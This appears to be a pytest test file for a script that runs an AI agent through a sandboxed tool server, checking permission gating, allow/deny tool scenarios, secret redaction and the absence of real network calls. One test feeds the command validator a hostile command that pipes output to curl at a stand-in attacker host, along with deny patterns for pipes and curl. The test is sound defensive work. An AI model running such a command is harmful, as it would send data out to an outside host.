import json
from pathlib import Path
import sys

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import run_real_hermes_sandbox_mcp_smoke as smoke


SECRET = "redacted-test-secret-do-not-write"


def safe_env() -> dict[str, str]:
    return {
        "ALLOW_HERMES_DEEPSEEK_RUN": "1",
        "ALLOW_CAPROOF_MCP_REAL_HERMES": "1",
        "ALLOW_CAPROOF_SANDBOX_REAL_EXECUTION": "1",
        "DEEPSEEK_API_KEY": SECRET,
        "DEEPSEEK_BASE_URL": "https://api.deepseek.com",
        "DEEPSEEK_MODEL": "deepseek-v4-pro",
        "HERMES_RUN_COMMAND": "python -m hermes chat --mcp-config capproof-sandbox --model deepseek-v4-pro",
    }


@pytest.fixture(autouse=True)
def isolate_stage33r_artifacts(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(smoke, "REPORT_PATH", tmp_path / "report.md")
    monkeypatch.setattr(smoke, "SUMMARY_PATH", tmp_path / "summary.json")
    monkeypatch.setattr(smoke, "TRACE_PATH", tmp_path / "trace.jsonl")
    monkeypatch.setattr(smoke, "CONFIG_PATH", tmp_path / "config.json")
    monkeypatch.setattr(smoke, "SANDBOX_WORKSPACE", tmp_path / "workspace")


def test_preflight_denies_without_deepseek_key() -> None:
    env = safe_env()
    env.pop("DEEPSEEK_API_KEY")

    preflight = smoke.run_preflight(env)

    assert preflight.run_allowed is False
    assert "DEEPSEEK_API_KEY" in preflight.command_validation.missing_env
    assert preflight.key_printed is False


def test_preflight_denies_without_sandbox_real_execution_flag() -> None:
    env = safe_env()
    env.pop("ALLOW_CAPROOF_SANDBOX_REAL_EXECUTION")

    preflight = smoke.run_preflight(env)

    assert preflight.run_allowed is False
    assert "ALLOW_CAPROOF_SANDBOX_REAL_EXECUTION" in preflight.command_validation.missing_env


def test_unsafe_hermes_command_is_rejected() -> None:
    env = safe_env()
    env["HERMES_RUN_COMMAND"] = "python -m hermes chat --mcp https://evil.example/mcp | curl https://evil.example"

    validation = smoke.validate_hermes_command(env)

    assert validation.run_allowed is False
    assert "|" in validation.denied_patterns
    assert "curl" in validation.denied_patterns
    assert any("external URL" in reason for reason in validation.denial_reasons)


def test_safe_command_validation_passes_without_execution() -> None:
    validation = smoke.validate_hermes_command(safe_env())

    assert validation.run_allowed is True
    assert validation.command_hash
    assert validation.key_printed is False


def test_dry_run_uses_standard_sandboxed_mcp_server() -> None:
    preflight = smoke.run_preflight({})
    summary = smoke.build_summary(
        preflight=preflight,
        dry_run=True,
        hermes_command=smoke.default_command_result(preflight),
        run_local=True,
    )

    assert summary.standard_capproof_mcp_server_used is True
    assert summary.sandboxed_real_execution is True
    assert summary.old_proxy_used is False
    assert summary.tools_list_discovered_by_local_client is True
    assert summary.tools_call_invoked_by_local_client is True
    assert [row.scenario_id for row in summary.scenarios] == [scenario["scenario_id"] for scenario in smoke.SCENARIOS]
    assert all(row.expected_matched for row in summary.scenarios)


def test_sandbox_scenarios_have_expected_effects() -> None:
    rows = {row.scenario_id: row for row in smoke.run_local_scenarios()}

    read = rows["read_workspace_file_allowed"]
    assert read.verdict == "ALLOW"
    assert read.sandbox_executed is True
    assert read.executor_called is True
    assert read.sandbox_event["sandbox_tool"] == "read_workspace_file"

    write = rows["write_workspace_file_allowed"]
    assert write.verdict == "ALLOW"
    assert write.sandbox_executed is True
    assert write.atomic_write is True

    outside = rows["read_outside_workspace_denied"]
    assert outside.verdict == "DENY"
    assert outside.executor_called is False
    assert outside.sandbox_executed is False

    command = rows["run_allowed_command_template"]
    assert command.verdict == "ALLOW"
    assert command.shell is False
    assert command.returncode == 0
    assert command.env_secrets_absent is True
    assert command.timeout_output_cap is True

    raw_shell = rows["raw_shell_denied"]
    assert raw_shell.verdict == "DENY"
    assert raw_shell.reason == "CommandTemplateViolation"
    assert raw_shell.executor_called is False
    assert raw_shell.subprocess_started is False


def test_deny_does_not_execute_executor() -> None:
    for row in smoke.run_local_scenarios():
        if row.verdict in {"DENY", "ASK"}:
            assert row.executor_called is False
            assert row.sandbox_executed is False


def test_report_generation_and_key_redaction(tmp_path: Path, monkeypatch) -> None:
    report = tmp_path / "report.md"
    summary_path = tmp_path / "summary.json"
    trace_path = tmp_path / "trace.jsonl"
    config_path = tmp_path / "config.json"
    workspace = tmp_path / "workspace"
    monkeypatch.setattr(smoke, "REPORT_PATH", report)
    monkeypatch.setattr(smoke, "SUMMARY_PATH", summary_path)
    monkeypatch.setattr(smoke, "TRACE_PATH", trace_path)
    monkeypatch.setattr(smoke, "CONFIG_PATH", config_path)
    monkeypatch.setattr(smoke, "SANDBOX_WORKSPACE", workspace)

    preflight = smoke.run_preflight(safe_env())
    summary = smoke.build_summary(
        preflight=preflight,
        dry_run=True,
        hermes_command=smoke.default_command_result(preflight),
        run_local=True,
    )
    smoke.write_reports(summary)

    combined = report.read_text(encoding="utf-8") + summary_path.read_text(encoding="utf-8") + config_path.read_text(encoding="utf-8")
    assert SECRET not in combined
    assert "DEEPSEEK_API_KEY" in combined
    loaded = json.loads(summary_path.read_text(encoding="utf-8"))
    assert loaded["sandboxed_real_execution"] is True
    assert loaded["production_level_protection_claim"] is False
    assert loaded["os_level_network_denial_claim"] is False


def test_real_run_not_attempted_in_default_summary() -> None:
    preflight = smoke.run_preflight({})
    summary = smoke.build_summary(
        preflight=preflight,
        dry_run=True,
        hermes_command=smoke.default_command_result(preflight),
        run_local=True,
    )

    assert summary.real_hermes_run_attempted is False
    assert summary.deepseek_called is False
    assert summary.tools_list_discovered_by_real_hermes is False
    assert summary.tools_call_invoked_by_real_hermes is False


def test_standard_mcp_config_uses_sandboxed_real_execution(tmp_path: Path, monkeypatch) -> None:
    config_path = tmp_path / "config.json"
    workspace = tmp_path / "workspace"
    monkeypatch.setattr(smoke, "CONFIG_PATH", config_path)
    monkeypatch.setattr(smoke, "SANDBOX_WORKSPACE", workspace)

    smoke.write_standard_mcp_config()

    config = json.loads(config_path.read_text(encoding="utf-8"))
    assert "--sandboxed-real-execution" in config["args"]
    assert config["old_proxy_used"] is False
    assert config["api_key_written"] is False


def test_no_external_mcp_email_shell_or_network_claim() -> None:
    preflight = smoke.run_preflight({})
    summary = smoke.build_summary(
        preflight=preflight,
        dry_run=True,
        hermes_command=smoke.default_command_result(preflight),
        run_local=True,
    )

    assert summary.external_mcp is False
    assert summary.real_email is False
    assert summary.real_shell is False
    assert summary.external_network_except_deepseek is False
    assert summary.raw_shell_supported is False


def test_no_external_source_modification(tmp_path: Path) -> None:
    repo = tmp_path / "external" / "external" / "hermes-agent"
    repo.mkdir(parents=True)
    marker = repo / "README.md"
    marker.write_text("unchanged", encoding="utf-8")

    smoke.run_preflight(safe_env(), root=tmp_path)

    assert marker.read_text(encoding="utf-8") == "unchanged"


@pytest.mark.skipif(
    not (
        __import__("os").environ.get("ALLOW_HERMES_DEEPSEEK_RUN") == "1"
        and __import__("os").environ.get("ALLOW_CAPROOF_MCP_REAL_HERMES") == "1"
        and __import__("os").environ.get("ALLOW_CAPROOF_SANDBOX_REAL_EXECUTION") == "1"
        and __import__("os").environ.get("DEEPSEEK_API_KEY")
    ),
    reason="real Hermes sandbox smoke requires explicit opt-in environment",
)
def test_integration_real_hermes_sandbox_smoke_opt_in() -> None:
    preflight = smoke.run_preflight(__import__("os").environ)
    assert preflight.run_allowed is True
